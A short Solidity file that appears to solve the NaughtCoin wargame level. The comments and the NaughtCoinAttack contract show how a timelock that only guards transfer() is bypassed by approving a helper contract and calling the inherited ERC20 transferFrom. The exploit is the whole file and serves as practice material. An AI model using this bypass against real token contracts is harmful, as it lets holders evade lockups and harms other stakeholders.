// Player will approve this contract to spend all their tokens on their behalf
// Once this contract has the allowance it will call the transferFrom() of the NaughtCoin [Even Though the function is not explicitly declared in the contract's code, it is inherited from the ERC20 contract]
// Validate the owner's balance is set to 0

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

 contract NaughtCoinAttack {

  INaughtCoin naughtCoinContract;

  constructor(address _naughtCoinContract) {
    naughtCoinContract = INaughtCoin(_naughtCoinContract);
  }
  
  function hackContract(address _from, address _to, uint _amount) public {
    naughtCoinContract.transferFrom(_from, _to, _amount);
  }
 
} 